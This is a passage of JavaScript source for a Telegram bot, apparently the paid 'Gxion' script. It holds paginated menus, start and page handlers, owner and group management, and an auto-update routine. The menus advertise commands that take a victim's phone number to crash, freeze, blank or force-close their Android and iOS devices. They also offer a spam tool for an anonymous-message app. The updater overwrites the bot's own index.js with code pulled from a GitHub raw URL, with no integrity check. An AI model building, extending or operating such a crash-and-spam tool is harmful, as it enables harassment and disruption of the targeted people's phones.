              inline_keyboard: keyboard
            }
          }
        );

      } catch {

        // fallback kalau caption sama
        await ctx.telegram.editMessageReplyMarkup(
          ctx.chat.id,
          msgId,
          undefined,
          {
            inline_keyboard: keyboard
          }
        ).catch(() => {});
      }

      // ================= UPDATE ACTIVE =================
      activeMenus.set(msgId, {
        ctx,
        caption,
        page,
        keyboardBuilder
      });

      return;
    }

    // ================= SEND AWAL =================
    const sent = await ctx.replyWithPhoto(
      IMAGES.home,
      {
        caption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: keyboard
        }
      }
    );

    // ================= SAVE ACTIVE =================
    activeMenus.set(sent.message_id, {
      ctx,
      caption,
      page,
      keyboardBuilder
    });

    return sent;

  } catch (err) {
    console.log("EDIT MENU ERROR:", err);
    return ctx.answerCbQuery().catch(() => {});
  }
}

// ================= SEND PAGE =================
async function sendPage(ctx, page = 0, pages) {

  const total = pages.length;

  if (page < 0) page = 0;
  if (page >= total) page = total - 1;

  const caption = pages[page];

  const keyboardBuilder = (discoColor) =>
  keyboardMenu(discoColor, page, total);

  const keyboard = keyboardBuilder(getDiscoColor());

  return editMenu(
    ctx,
    caption,
    keyboard,
    page,
    keyboardBuilder
  );
}

// ================= KEYBOARD MENU =================
const keyboardMenu = (discoColor, page, total) => {

  const safeTotal = total || 1;

  const backPage = page <= 0 ? safeTotal - 1 : page - 1;
  const nextPage = page >= safeTotal - 1 ? 0 : page + 1;

  return [

    [
      {
        text: "ʙᴀᴄᴋ",
        callback_data: `page_${backPage}`,
        style: discoColor,
        icon_custom_emoji_id: "6043846127453738864"
      },
      {
        text: "ʜᴏᴍᴇ",
        callback_data: "page_0",
        style: discoColor,
        icon_custom_emoji_id: "5893431652578758294"
      },
      {
        text: "ɴᴇxᴛ",
        callback_data: `page_${nextPage}`,
        style: discoColor,
        icon_custom_emoji_id: "5278576306420742464"
      }
    ],

    // ================= MENU 1 =================
    [
      {
        text: "sᴇᴛᴛɪɴɢ",
        callback_data: "page_1",
        style: discoColor,
        icon_custom_emoji_id: "5893450623449305489"
      },
      {
        text: "sʏsᴛᴇᴍ",
        callback_data: "page_2",
        style: discoColor,
        icon_custom_emoji_id: "6041705726206808304"
      },      
      {
        text: "ʙᴜɢ ᴍᴇɴᴜ",
        callback_data: "page_3",
        style: discoColor,
        icon_custom_emoji_id: "5893450623449305489"
      }
    ],

    // OWNER
    [
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Bawzhhh",
        style: discoColor,
        icon_custom_emoji_id: "5902335789798265487"
      }
    ]
  ];
};

// ================= FAST HANDLER =================
bot.action(/page_(\d+)/, async (ctx) => {
  try {

    const userId = ctx.from.id;
    const now = Date.now();

    // ================= ANTI SPAM CLICK =================
    if (clickCooldown.has(userId)) {

      const last = clickCooldown.get(userId);

      if (now - last < 350) {
        return ctx.answerCbQuery("ᴅᴏɴᴛ sᴘᴀᴍ", {
          show_alert: false
        }).catch(() => {});
      }
    }

    clickCooldown.set(userId, now);

    const targetPage = Number(ctx.match[1]);

    // ================= USER DATA =================
    const user = ctx.from;

    const username = user.username
      ? `@${user.username}`
      : user.first_name || "Tidak Diketahui";

    const chatId = user.id;

    // ================= GET PAGE =================
    const pages = getPages({
      user,
      username,
      chatId
    });

    // ================= SEND PAGE =================
    await sendPage(ctx, targetPage, pages);

    await ctx.answerCbQuery().catch(() => {});

  } catch (err) {
    console.log("PAGE ERROR:", err);
  }
});

// ================= NOOP =================
bot.action("noop", async (ctx) => {
  return ctx.answerCbQuery().catch(() => {});
});

// ================= START =================
bot.command("start", async (ctx) => {
  try {

    // ================= USER DATA =================
    const user = ctx.from;

    const username = user.username
      ? `@${user.username}`
      : user.first_name || "Tidak Diketahui";

    const chatId = user.id;

    // ================= GET PAGE =================
    const pages = getPages({
      user,
      username,
      chatId
    });

    // ================= SEND PAGE =================
    await sendPage(ctx, 0, pages);

    // ================= TYPING =================
    await ctx.telegram.sendChatAction(
      ctx.chat.id,
      "typing"
    );

  } catch (err) {
    console.log("START ERROR:", err);
  }
});
// ================= RUNTIME =================
function runtime(seconds) {
  seconds = Number(seconds);

  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor(seconds % (3600 * 24) / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);

  return [
    d ? `${d}d` : "",
    h ? `${h}h` : "",
    m ? `${m}m` : "",
    `${s}s`
  ].filter(Boolean).join(" ");
}

// ================= CEK KONEKSI SENDER =================
function getSenderStatus() {
  try {

    const up = runtime(process.uptime());

    if (sock?.user?.id) {

      const number = sock.user.id.split(":")[0];

      const masked =
        number.length > 6
          ? number.slice(0, 2) +
            "xxxxxxxx" +
            number.slice(-2)
          : number;

      return `ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴇɴᴅᴇʀ (${masked})
ʀᴜɴᴛɪᴍᴇ : ${up}`;
    }

    return `ɴᴏᴛ ᴄᴏɴɴᴇᴄᴛ sᴇɴᴅᴇʀ
ʀᴜɴᴛɪᴍᴇ : ${up}`;

  } catch {
    return "ɴᴏᴛ ᴄᴏɴɴᴇᴄᴛ sᴇɴᴅᴇʀ";
  }
}
// ================= DATA PAGE =================
const getPages = ({ user, username, chatId }) => [
` 
<blockquote><tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> ₲ Ӿ ł Ø ₦ 乂 ₳ⱠⱠ ₮Ɇ₳M̸͟͞

〔 INFORMATION ₲ Ӿ ł Ø ₦ 〕
━━━━━━━━━━━━━━━━━━━━━━
⌬ <tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Bawzhhh
⌬ <tg-emoji emoji-id="4956560549287560231">🌐</tg-emoji> sʏsᴛᴇᴍ : 𝘼𝙪𝙩𝙤 𝙐𝙥𝙙𝙖𝙩𝙚
⌬ <tg-emoji emoji-id="4958699241137505132">🎁</tg-emoji> ᴠᴇʀsɪᴏɴ : 25.0 Light バージョン
⌬ <tg-emoji emoji-id="4958506272551863292">📊</tg-emoji> sᴛᴀᴛᴜs  : Premium Verified<tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
<blockquote>
〔 INFORMATION ฿Ø₮ 〕
━━━━━━━━━━━━━━━━━━━━━━
⌬ <tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${getSenderStatus()}
⌬ <tg-emoji emoji-id="5893102202817352158">🕞</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${runtime(process.uptime())}
⌬ <tg-emoji emoji-id="4972406813946282823">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : ${username}
⌬ <tg-emoji emoji-id="5895444149699612825">📊</tg-emoji> ᴜsᴇʀ ɪᴅ : ${chatId}</blockquote>
<blockquote>
[ INFORMATION PRICE SC GXION ]
━━━━━━━━━━━━━━━━━━━━━━
⿻ Silahkan Ketik /pricescript Untuk Melihat Harga Title / Roles Dan Benefit Membeli Script Gxion ini.
</blockquote>
<blockquote>༺━━━━━━━━━━━༻
Ｐａｇｅ : 1 / 6
༺━━━━━━━━━━━༻

𝗧𝗮𝗽 𝘁𝗵𝗲 𝗻𝗲𝘅𝘁 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 <tg-emoji emoji-id="4956507094124594921">➕</tg-emoji> →</blockquote>
`,

` 

<blockquote>
━━━━━━━━━━━━━━━━━━━━━━
⚔ SETTING CONTROL VERSION 1 ⚔
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/addgc</i>
⤷ ✆ -> Add Group Prem.
⌬ <i>/delgc</i>
⤷ ✆ -> Dell Group Prem
⌬ <i>/listgroup</i>
⤷ ✆ -> List Group Prem
⌬ <i>/groupon</i>
⤷ ✆ -> Bot Mode Group
⌬ <i>/groupoff</i>
⤷ ✆ -> Bot Mode Public
⌬ <i>/anticulik</i>
⤷ ✆ -> Anti Culik Bot
⌬ <i>/addsafe</i>
⤷ ✆ -> Add Safe
⌬ <i>/delsafe</i>
⤷ ✆ -> Del Safe
⌬ <i>/antifoto</i>
⤷ ✆ -> Block Foto
⌬ <i>/antivideo</i>
⤷ ✆ -> Block Video
⌬ <i>/list</i>
⤷ ✆ -> List User Access
⌬ <i>/addowner</i>
⤷ ✆ -> Add Owner Access
⌬ <i>/delowner</i>
⤷ ✆ -> Del Owner Access
⌬ <i>/addadmin</i>
⤷ ✆ -> Add Admin Access
⌬ <i>/deladmin</i>
⤷ ✆ -> Del Admin Access
⌬ <i>/addprem</i>
⤷ ✆ -> Add Prem Access
⌬ <i>/delprem</i>
⤷ ✆ -> Del Prem Access
⌬ <i>/rasukbot</i>
⤷ ✆ -> Rasuk Bot User
⌬ <i>/cekbot</i>
⤷ ✆ -> Checked Ping
⌬ <i>/setcd</i>
⤷ ✆ -> Settings Cooldown
⌬ <i>/self</i>
⤷ ✆ -> Lock Bot 
⌬ <i>/public</i>
⤷ ✆ -> Public Bot</blockquote>
<blockquote>Security Script : ACTIVE
System : • Online

༺━━━━━━━━━━━༻
Ｐａｇｅ : 2 / 6
༺━━━━━━━━━━━༻

𝗧𝗮𝗽 𝘁𝗵𝗲 𝗻𝗲𝘅𝘁 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 <tg-emoji emoji-id="4956507094124594921">➕</tg-emoji> →</blockquote>
`,

` 
<blockquote>
━━━━━━━━━━━━━━━━━━━━━━
⚔ SETTING CONTROL VERSION 2 ⚔
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/pullupdate</i>
⤷ ✆ -> Auto Update Script
⌬ <i>/lastupdate</i>
⤷ ✆ -> Check Last Update
⌬ <i>/setchannel</i>
⤷ ✆ -> Set Channel
⌬ <i>/runtime</i>
⤷ ✆ -> Check Runtime
⌬ <i>/mode</i>
⤷ ✆ -> Mode Bot
⌬ <i>/cekowner</i>
⤷ ✆ -> Check Owner
⌬ <i>/offcmd</i>
⤷ ✆ -> Block Command
⌬ <i>/oncmd</i>
⤷ ✆ -> Unblock Command
⌬ <i>/offcmdlist</i>
⤷ ✆ -> List Blocked Command
⌬ <i>/lockallcmd</i>
⤷ ✆ -> Lock All Command
⌬ <i>/unlockallcmd</i>
⤷ ✆ -> Unlock All Command
⌬ <i>/connect</i>
⤷ ✆ -> Connect Sender
⌬ <i>/killsesi</i>
⤷ ✆ -> Delete Session
⌬ <i>/cekemoji</i>
⤷ ✆ -> Check Premium Emoji ID
⌬ <i>/restart</i>
⤷ ✆ -> Restart Panel Automatic</blockquote>
<blockquote>Security Script : ACTIVE
System : • Online

༺━━━━━━━━━━━༻
Ｐａｇｅ : 3 / 6
༺━━━━━━━━━━━༻

𝗧𝗮𝗽 𝘁𝗵𝗲 𝗻𝗲𝘅𝘁 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 <tg-emoji emoji-id="4956507094124594921">➕</tg-emoji> →</blockquote>
`,

` 
<blockquote>฿Ɇ฿₳₴ ₴₱₳₥ ₣ØⱤ ☇ ₴Ɇ₦ĐɆⱤ ₦Ø₭Ø₴ ฿Ʉ₲₴ <tg-emoji emoji-id="5267511242305590210">😈</tg-emoji>
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/xmonroe</i> 62xxxxx
⤷ ✆ ☇ Bebas Spam For Murbug Delay
⌬ <i>/balancedxlay</i> 62xxxxx
⤷ ✆ ☇ Bebas Spam For Murbug Delay
⌬ <i>/flowerxdelay</i> 62xxxxx
⤷ ✆ ☇ Bebas Spam For Murbug Delay
╰────────────────────╯</blockquote>
<blockquote>฿Ɇ฿₳₴ ₴₱₳₥ ₣ØⱤ ☇ ₴Ɇ₦ĐɆⱤ ₵₳ⱤĐ / ₭₳Ɽ₮Ʉ ฿Ʉ₲₴ <tg-emoji emoji-id="5267059321551732408">🔪</tg-emoji> 
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/velixiry</i> 62xxxxx
⤷ ✆ ☇ Combo Delay Infinity
⌬ <i>/superbug</i> 62xxxxx
⤷ ✆ ☇ Delay Combo Bulldozer
⌬ <i>/bugsxios</i> 62xxxxx
⤷ ✆ ☇ Forceclose Ios (Iphone Bugs)
╰────────────────────╯</blockquote>
<blockquote>ł₦₣ł₦ł₮Ɏ ☇ ₦Ø₮ ₴₱₳₥ ฿Ʉ₲₴ ₮Ɏ₱Ɇ <tg-emoji emoji-id="5266995884884767812">👁</tg-emoji>
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/superblank</i> 62xxxxx
⤷ ✆ ☇ Blank Android Type
⌬ <i>/onehitxblank</i> 62xxxxx
⤷ ✆ ☇ One Hit Blank UI
⌬ <i>/xattack</i> 62xxxxx
⤷ ✆ ☇ Crashed Android New
⌬ <i>/xtlz</i> 62xxxxx
⤷ ✆ ☇ Freeze Android Low
⌬ <i>/xcombo</i> 62xxxxx
⤷ ✆ ☇ Combo All Bugs Function
⌬ <i>/delaybrutalx</i> 62xxxxx
⤷ ✆ ☇ Delay Hard Brutal Bugs
⌬ <i>/testbug</i> 62xxxxx
⤷ ✆ ☇ Test Function Bugs
╰────────────────────╯</blockquote>
<blockquote><b>Security Script</b> : ACTIVE
<b>System</b> : • Online

༺━━━━━━━━━━━༻
Ｐａｇｅ : 4 / 6
༺━━━━━━━━━━━༻ 

𝗧𝗮𝗽 𝘁𝗵𝗲 𝗻𝗲𝘅𝘁 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 <tg-emoji emoji-id="4956507094124594921">➕</tg-emoji> →</blockquote>
`,

` 
<blockquote>
━━━━━━━━━━━━━━━━━━━━━━
⚔ TOOLS MENU ⚔
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/spamngl</i>
⤷ ✆ -> Spam Ngl Apps
⌬ <i>/brat</i>
⤷ ✆ -> Brat Text Maker
⌬ <i>/catbox</i>
⤷ ✆ -> Catbox To Foto
⌬ <i>/catboxurl</i>
⤷ ✆ -> Foto To Catbox
⌬ <i>/convert</i>
⤷ ✆ -> Convert Media
⌬ <i>/hd</i>
⤷ ✆ -> HD Foto
⌬ <i>/removebg</i>
⤷ ✆ -> Remove Background Foto
⌬ <i>/tiktokdl</i>
⤷ ✆ -> Download Video TikTok
⌬ <i>/snack</i>
⤷ ✆ -> Download Video SnackVideo
⌬ <i>/cekmasadepan</i>
⤷ ✆ -> Ramalan Random Fun
⌬ <i>/cuaca</i>
⤷ ✆ -> Mengecek Cuaca
⌬ <i>/time</i>
⤷ ✆ -> Mengecek Waktu Indonesia
⌬ <i>/ssiphone</i>
⤷ ✆ -> SS iPhone Thema
⌬ <i>/decjs</i>
⤷ ✆ -> Encrypted File.js
⌬ <i>/harga</i>
⤷ ✆ -> Cek harga Script
⌬ <i>/cekfunction</i>
⤷ ✆ -> Cek Error Function
⌬ /jadwalsholat 
⤷ ✆ -> Cek Jadwal Sholat Indonesia
⌬ <i>/reactch</i>
⤷ ✆ -> Reaction To Your Channel
╰────────────────────╯</blockquote>
<blockquote>Security Script : ACTIVE
System : • Online

༺━━━━━━━━━━━༻
Ｐａｇｅ : 5 / 6
༺━━━━━━━━━━━༻

𝗧𝗮𝗽 𝘁𝗵𝗲 𝗻𝗲𝘅𝘁 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 <tg-emoji emoji-id="4956507094124594921">➕</tg-emoji> →</blockquote>
`,

` 
<blockquote>⟡━━━━━━━━━━━━━━━━━━━━━━━━━━⟡
        THANKS TO ALL FOR EVER GXION
⟡━━━━━━━━━━━━━━━━━━━━━━━━━━⟡
〔⚘〕Bawzhhh      ⤷ Developer Script
〔⚘〕Arfi         ⤷ Best Friend RL
〔⚘〕Radit        ⤷ Best Friend RL
〔⚘〕Xatanical    ⤷ Best Support
〔⚘〕Xwar         ⤷ Best Support
〔⚘〕Ryu          ⤷ Friend
〔⚘〕Lixx         ⤷ Friend
〔⚘〕Raffi        ⤷ Friend
〔⚘〕SirwyuX      ⤷ Friend
〔⚘〕Hanhh        ⤷ Friend
〔⚘〕Manxx        ⤷ Friend
〔⚘〕Xiao         ⤷ Friend
〔⚘〕Kinn         ⤷ Beautiful Girl
〔⚘〕Axeleon      ⤷ Friend
⟡━━━━━━━━━━━━━━━━━━━━━━━━━━⟡
      GXION WOULD NOT BE
      THE SAME WITHOUT YOU 🌸
⟡━━━━━━━━━━━━━━━━━━━━━━━━━━⟡</blockquote>
<blockquote>┃𑁍 Security Script : ACTIVE
┃𑁍 System : • Online

༺━━━━━━━━━━━༻
ＰＡＧＥ : 6 / 6
༺━━━━━━━━━━━༻

𝗧𝗮𝗽 𝘁𝗵𝗲 𝗻𝗲𝘅𝘁 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 <tg-emoji emoji-id="4956507094124594921">➕</tg-emoji> →</blockquote>
`,
];

// ================= DELAY BEBAS SPAM BUG V1 =================
bot.action("spam", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
<blockquote>฿Ɇ฿₳₴ ₴₱₳₥ ₣ØⱤ ☇ ₴Ɇ₦ĐɆⱤ ₦Ø₭Ø₴ ฿Ʉ₲₴ <tg-emoji emoji-id="5267511242305590210">😈</tg-emoji>
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/xmonroe</i> 62xxxxx
⤷ ✆ ☇ Bebas Spam For Murbug Delay
⌬ <i>/balancedxlay</i> 62xxxxx
⤷ ✆ ☇ Bebas Spam For Murbug Delay
⌬ <i>/flowerxdelay</i> 62xxxxx
⤷ ✆ ☇ Bebas Spam For Murbug Delay
╰────────────────────╯

฿Ɇ฿₳₴ ₴₱₳₥ ₣ØⱤ ☇ ₴Ɇ₦ĐɆⱤ ₵₳ⱤĐ / ₭₳Ɽ₮Ʉ ฿Ʉ₲₴ <tg-emoji emoji-id="5267059321551732408">🔪</tg-emoji> 
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/velixiry</i> 62xxxxx
⤷ ✆ ☇ Combo Delay Infinity
⌬ <i>/superbug</i> 62xxxxx
⤷ ✆ ☇ Delay Combo Bulldozer
⌬ <i>/bugsxios</i> 62xxxxx
⤷ ✆ ☇ Forceclose Ios (Iphone Bugs)
╰────────────────────╯

ł₦₣ł₦ł₮Ɏ ☇ ₦Ø₮ ₴₱₳₥ ฿Ʉ₲₴ ₮Ɏ₱Ɇ <tg-emoji emoji-id="5266995884884767812">👁</tg-emoji>
━━━━━━━━━━━━━━━━━━━━━━
⌬ <i>/superblank</i> 62xxxxx
⤷ ✆ ☇ Blank Android Type
⌬ <i>/onehitxblank</i> 62xxxxx
⤷ ✆ ☇ One Hit Blank UI
⌬ <i>/xattack</i> 62xxxxx
⤷ ✆ ☇ Crashed Android New
⌬ <i>/xtlz</i> 62xxxxx
⤷ ✆ ☇ Freeze Android Low
⌬ <i>/xcombo</i> 62xxxxx
⤷ ✆ ☇ Combo All Bugs Function
⌬ <i>/delaybrutalx/i> 62xxxxx
⤷ ✆ ☇ Delay Invisible Brutal Bugs
⌬ <i>/testbug</i> 62xxxxx
⤷ ✆ ☇ Test Function Bugs
╰────────────────────╯

<b>Security Script</b> : ACTIVE
<b>System</b> : • Online

༺━━━━━━━━━━━༻
Ｐａｇｅ : 4 / 8
༺━━━━━━━━━━━༻ 
𝗧𝗮𝗽 𝘁𝗵𝗲 𝗻𝗲𝘅𝘁 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 →</blockquote>
`, 
[
  [
    { 
      text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", 
      callback_data: "page_4", 
      style: "primary", 
      icon_custom_emoji_id: "5352759161945867747" 
    },

    { 
      text: "ᴏᴡɴᴇʀ",
      url: "https://t.me/Bawzhhh",
      style: "danger",
      icon_custom_emoji_id: "4956420859771225351"
    },

    { 
      text: "ɴᴇxᴛ",
      callback_data: "page_5",
      style: "success",
      icon_custom_emoji_id: "5278576306420742464"
    }
  ]
]);
});

//------------------(AUTO - UPDATE SYSTEM)--------------------//
bot.command("pullupdate", async (ctx) => doUpdate(ctx));

const UPDATE_URL =
  "https://raw.githubusercontent.com/Unbandfoul/mataneasu/refs/heads/main/index.js";

const thumbnailUp = "https://files.catbox.moe/xd8m5h.jpg";

const UPDATE_FILE_PATH = "./index.js";

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Khusus owner!");
  }

  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu...", {
    parse_mode: "HTML",
  });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply(
      "✅ <b>Update berhasil!</b>\n📄 File Ditemukan: <b>index.js</b>\n♻️ <b>Restarting bot...</b>",
      {
        parse_mode: "HTML",
      }
    );

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
}
//------------------(CHECK - UPDATE SYSTEM)--------------------//
function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function normalize(str) {
  return String(str).replace(/\r/g, "").trim();
}

function fetchRemote(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = "";

      if (res.statusCode !== 200) {
        return reject(new Error("HTTP_" + res.statusCode));
      }

      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve(data));
    }).on("error", reject);
  });
}

bot.command("checkupdate", async (ctx) => checkUpdate(ctx));

async function checkUpdate(ctx) {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Khusus owner!");
  }

  const msg = await ctx.reply("🔍 Initializing update check...");

  try {
    // 🔄 loading system
    const steps = [
      "🛰 Contacting github...",
      "📦 Connected successfully...",
      "📥 Extracting the index.js file...",
      "⚙️ Found and searching for the latest version...",
      "🔐 the system successfully detected..."
    ];

    for (const step of steps) {
      await sleep(300);
      await ctx.telegram.editMessageText(
        msg.chat.id,
        msg.message_id,
        undefined,
        `⏳ <b>CHECKING UPDATE</b>\n\n${step}`,
        { parse_mode: "HTML" }
      );
    }

    // 🔥 RAW GitHub langsung (tanpa variable URL)
    const remote = await fetchRemote(
      "https://raw.githubusercontent.com/Unbandfoul/mataneasu/main/index.js"
    );

    const local = fs.readFileSync("./index.js", "utf8");

    const same = normalize(remote) === normalize(local);

    // ❌ NO UPDATE
    if (same) {
      return ctx.telegram.editMessageText(
        msg.chat.id,
        msg.message_id,
        undefined,
        `📌 <b>SYSTEM STATUS</b>

━━━━━━━━━━━━━━━━━━
🟢 STATUS : UP TO DATE
🔒 VERSION : LATEST BUILD
⚡ ENGINE : STABLE
━━━━━━━━━━━━━━━━━━

Tidak ada update terbaru yang di temukan oleh system.`,
        { parse_mode: "HTML" }
      );
    }

    // 🆕 UPDATE FOUND
    return ctx.telegram.editMessageText(
      msg.chat.id,
      msg.message_id,
      undefined,
      `🚨 <b>UPDATE DETECTED</b>

━━━━━━━━━━━━━━━━━━
♻️ STATUS : NEW VERSION SCRIPT
⚡ SOURCE : GitHub Raw
📦 SYSTEM : OUTDATED
📂 FILE     : index.js
━━━━━━━━━━━━━━━━━━

💡 Update tersedia, segera jalankan /update. Untuk mendapatkan versi terbaru dan agar Script menjadi stabil • high • premium

━━━━━━━━━━━━━━━━━━
GXION DETECTED SYSTEM ACTIVE`,
      { parse_mode: "HTML" }
    );

  } catch (e) {
    return ctx.telegram.editMessageText(
      msg.chat.id,
      msg.message_id,
      undefined,
      `❌ <b>FAILED CHECK UPDATE</b>\n\n<code>${e.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
}
//------------------(CHECK KAPAN TERAKHIR UPDATE DILAKUKAN)--------------------//
bot.command("lastupdate", async (ctx) => {
  try {
    const file = await fetchRemote(
      "https://raw.githubusercontent.com/Unbandfoul/mataneasu/main/index.js"
    );

    // ambil otomatis dari RAW github
    const version =
      (file.match(/VERSION:\s*(.+)/) || [])[1]?.trim() || "Tidak Diketahui";

    const lastUpdate =
      (file.match(/LAST_UPDATE:\s*(.+)/) || [])[1]?.trim() || "Tidak Diketahui";

    return ctx.reply(
`
🚨 SYSTEM UPDATE INFORMATION 🚨
━━━━━━━━━━━━━━━━━━
📦 VERSION      : ${version}
📅 LAST UPDATE  : ${lastUpdate}
━━━━━━━━━━━━━━━━━━━━━━
🔍 SOURCE       : GitHub Raw
⚡ STATUS       : ACTIVE SYSTEM
🛡 INTEGRITY    : VERIFIED
━━━━━━━━━━━━━━━━━━━━━━

💬 Feature ini mendeteksi secara langsung dari Github dan Raw.
╚══════════════════════╝`
    );

  } catch (e) {
    return ctx.reply(
`❌ SYSTEM ERROR

━━━━━━━━━━━━━━
⚠️ FAILED TO FETCH DATA
🔧 REASON : ${e.message}
━━━━━━━━━━━━━━`
    );
  }
});
/// CASE BUAT OWNER MENU ///
bot.command("addgc", checkOwner, async (ctx) => {
  try {

    // ================= PRIVATE CHECK =================
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    // ================= GET GROUP DATA =================
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Unknown";

    // ================= LOAD DATA =================
    let premiumGroups = loadPremiumGroups();

    // ================= CHECK DUPLICATE =================
    if (premiumGroups.includes(groupId)) {
      return ctx.reply(
`<blockquote><b>⚠️ GROUP SUDAH PREMIUM</b>

<b>Id Group :</b> ${groupId}
<b>Name Group :</b> ${groupName}
<b>Status :</b> Already Registered</blockquote>`,
      { parse_mode: "HTML" }
      );
    }

    // ================= ADD GROUP =================
    premiumGroups.push(groupId);
    savePremiumGroups(premiumGroups);

    // ================= SUCCESS RESPONSE =================
    return ctx.reply(
`<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>SUCCSSFULLY ADDED GROUP</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

<b>Id Group :</b> ${groupId}
<b>Name Group :</b> ${groupName}
<b>Status :</b> Succesfully
<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("delgc", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("listgroup", checkOwner, async (ctx) => {

  try {

    // ================= LOAD DATA =================
    const premiumGroups = loadPremiumGroups();

    // ================= EMPTY CHECK =================
    if (!premiumGroups || premiumGroups.length < 1) {

      return ctx.reply(

`<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>GROUP PREMIUM NOT FOUND</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

Tidak ada group premium yang terdaftar.

<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>`,

        {
          parse_mode: "HTML"
        }

      );

    }

    // ================= HEADER =================
    let text = `
<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>LIST GROUP PREMIUM</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>

`;

    // ================= LOOP GROUP =================
    for (let i = 0; i < premiumGroups.length; i++) {

      const groupId = premiumGroups[i];

      try {

        const groupData =
          await ctx.telegram.getChat(groupId);

        const groupName =
          groupData.title || "Unknown";

        text += `
<blockquote>
<b>${i + 1}. ${groupName}</b>

<b>Id Group :</b> <code>${groupId}</code>
<b>Status :</b> Premium Active √
</blockquote>
`;

      } catch {

        text += `
<blockquote>
<b>${i + 1}. Unknown Group</b>

<b>Id Group :</b> <code>${groupId}</code>
<b>Status :</b> Bot Left / Invalid
</blockquote>
`;

      }

    }

    // ================= FOOTER =================
    text += `
<blockquote><b>Total Group Premium :</b> ${premiumGroups.length}</blockquote>
`;

    // ================= SEND =================
    return ctx.reply(text, {
      parse_mode: "HTML"
    });

  } catch (err) {

    console.error(err);

    return ctx.reply(
      "❌ Terjadi error saat mengambil list group"
    );

  }

});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});

// ========== COMMAND /addowner (BUTTON CONFIRM) ==========
bot.command("addowner", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
